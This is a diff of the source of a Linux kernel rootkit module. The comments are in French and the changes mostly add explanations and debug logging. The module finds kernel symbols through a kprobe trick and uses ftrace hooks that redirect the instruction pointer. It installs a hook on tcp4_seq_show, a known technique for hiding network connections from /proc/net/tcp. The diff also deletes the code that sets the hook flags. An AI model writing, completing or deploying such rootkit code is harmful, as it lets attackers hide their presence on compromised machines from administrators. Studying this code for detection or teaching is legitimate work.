@@ -1,8 +1,8 @@
 #include <linux/init.h>
-#include <linux/module.h>
+#include <linux/module.h> // pour manipuler les modules du noyau
 #include <linux/kernel.h>
-#include <linux/syscalls.h>
-#include <linux/kallsyms.h>
+#include <linux/syscalls.h> // pour intercepter les syscalls
+#include <linux/kallsyms.h> //pour la réflexion des symboles du kernel
 #include <linux/version.h>
 #include <linux/ftrace.h> // Include this header for struct ftrace_ops
 #include <linux/linkage.h>
@@ -10,8 +10,6 @@
 #include <linux/uaccess.h>
 #include <linux/kprobes.h>
 #include <net/tcp.h>
-
-// #include "ftrace_helper.h"
 
 // licence du module (GPL = General Public License) en gros opensource
 // le LKM sera marqué comme propriétaire si on ne mets pas ca et si le noyau impose des restrictions sur les modules propriétaires, ca peut poser des problemes
@@ -26,11 +24,12 @@ MODULE_VERSION("0.01");
 #define PTREGS_SYSCALL_STUBS 1
 #endif
 
-// en 5.7 ou +, kallsyms_lookup_name (qui sert a récupe l'adr d'un f°) est plus dispo, mais kprobes peut faire le job
+// en 5.7 ou +, kallsyms_lookup_name (qui sert a la réflexion d'une f°) est plus dispo, mais kprobes peut faire le job
+// kprobs permet d'inspecter et de modifier le comportement d'une fonction pdt l'éxécution
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
 #define KPROBE_LOOKUP 1
 #include <linux/kprobes.h>
-//on intercepte ici la f° kallsyms_lookup_name
+
 static struct kprobe kp = {
     .symbol_name = "kallsyms_lookup_name"
 };
@@ -42,7 +41,10 @@ static struct kprobe kp = {
 #pragma GCC optimize("-fno-optimize-sibling-calls")
 #endif
 
-// Define the ftrace_ops structure
+// hook -> mecanismes pour intercepter l'éxécution d'un fonction
+// ftrace -> technique de tracage du noyau qui sert a intercepter f°
+
+// Define la struct ftrace_ops, défini les fonctions a intercépté 
 struct ftrace_ops {
     int (*func)(unsigned long, unsigned long, struct ftrace_ops *, struct pt_regs *);
     unsigned long flags;
@@ -81,50 +83,57 @@ int fh_install_hooks(struct ftrace_hook *hooks, size_t count);
 // f° qui résoud l'adr de la f° a hook
 static int fh_resolve_hook_address(struct ftrace_hook *hook)
 {
+
+// petite douille pour pouvoir utiliser kallsyms_lookup_name sans que la fonction soit exporté
 #ifdef KPROBE_LOOKUP
     typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
     kallsyms_lookup_name_t kallsyms_lookup_name;
     register_kprobe(&kp);
+    printk(KERN_DEBUG "rootkit: Resolving kallsyms_lookup_name\n");
     kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;    
     unregister_kprobe(&kp);
+    if (!kallsyms_lookup_name) {
+        printk(KERN_DEBUG "rootkit: kallsyms_lookup_name is NULL\n");
+        return -ENOENT;
+    }
+
 #endif
+
     // ensuite on stock l'adr de la f° dans hook->address
+    printk(KERN_DEBUG "rootkit: Resolving address for %s\n", hook->name);
     hook->address = kallsyms_lookup_name(hook->name);
+    printk(KERN_DEBUG "rootkit: Resolved address: %lx\n", hook->address);
 
     if (!hook->address)
     {   
         // si on trouve pas l'adr, on affiche un msg d'erreur erreur no entity
-        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
+        printk(KERN_DEBUG "rootkit: kallsyms_lookup_name() failed for %s\n", hook->name);
         return -ENOENT;
     }
 
-// si on a pas trouvé l'adr, on retourne 0  
-#if USE_FENTRY_OFFSET
-    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
-#else
-    *((unsigned long*) hook->original) = hook->address;
-#endif
+    // si on a pas trouvé l'adr, on retourne 0  
+    #if USE_FENTRY_OFFSET
+        *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
+    #else
+        *((unsigned long*) hook->original) = hook->address;
+    #endif
 
     printk(KERN_DEBUG "rootkit: Resolved address for %s: %p\n", hook->name, (void *)hook->address);
     return 0;
 }
 
 
-
 // fonction qui redirige l'exécution vers la nouvelle fonction définie dans le hook
 static int notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
 {
-    // récup le pointeur vers la struct ftrace_hook depuis ops
+    // container_of -> donne l'adr de la structure qui contient ops(qui contient les info du hook)
     struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
 
-#if USE_FENTRY_OFFSET
-    //modifie le pointeur d'instruction en redirigeant ainsi le flux d'exécution vers la fonction hookée
-    regs->ip = (unsigned long) hook->function;
-#else
-    // on vérifie si l'adr de la f° est dans le module courant
+    // on vérifie si l'adr de la f° est dans le module courant (sinon boucle infini)
     if(!within_module(parent_ip, THIS_MODULE))
+        // ip -> adr de l'instruction actuellement éxécuté
         regs->ip = (unsigned long) hook->function;
-#endif
+
     return 0;
 }
 
@@ -134,6 +143,7 @@ int fh_install_hook(struct ftrace_hook *hook)
 {
     int err;
     err = fh_resolve_hook_address(hook);
+    printk(KERN_DEBUG "rootkit: fh_resolve_hook_address() returned: %d\n", err);
     if (err) {
         printk(KERN_DEBUG "rootkit: fh_resolve_hook_address() failed: %d\n", err);
         return err;
@@ -141,19 +151,14 @@ int fh_install_hook(struct ftrace_hook *hook)
 
     hook->ops.func = fh_ftrace_thunk;
 
-    // Check if the flags are defined before using them
-#ifdef FTRACE_OPS_FL_SAVE_REGS
-    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE | FTRACE_OPS_FL_IPMODIFY;
-#elif defined(FTRACE_OPS_FL_RECURSION_SAFE) && defined(FTRACE_OPS_FL_IPMODIFY)
-    hook->ops.flags = FTRACE_OPS_FL_RECURSION_SAFE | FTRACE_OPS_FL_IPMODIFY;
-#else
-    // Handle case where flags are not defined
-    hook->ops.flags = 0;  // Or use some default flag setting
-#endif
-
     printk(KERN_DEBUG "rootkit: Attempting to set filter for address: %p\n", (void *)hook->address);
+    printk(KERN_DEBUG "rootkit: hook->ops.func = %p\n", hook->ops.func);
+    printk(KERN_DEBUG "rootkit: hook->ops.flags = %lx\n", hook->ops.flags);
+    printk(KERN_DEBUG "rootkit: hook->function = %p\n", hook->function);
+    printk(KERN_DEBUG "rootkit: hook->original = %p\n", hook->original);
 
     err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+    printk(KERN_DEBUG "rootkit: ftrace_set_filter for address: %p returned: %d\n", (void *)hook->address, err);
     if (err) {
         printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
         return err;
@@ -262,11 +267,10 @@ static int __init rootkit_init(void)
 {
     int err;
     printk(KERN_INFO "rootkit: Installing hook for tcp4_seq_show\n");
-    // printk(KERN_INFO "hooks= %u\n", hooks)
-    // printk(KERN_INFO "hooks array size= %u\n", ARRAY_SIZE(hooks))
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if(err) {
         printk(KERN_ERR "rootkit: Failed to install hook\n");
+        printk(KERN_ERR "rootkit: Error code: %d\n", err);
         return err;
     }
 
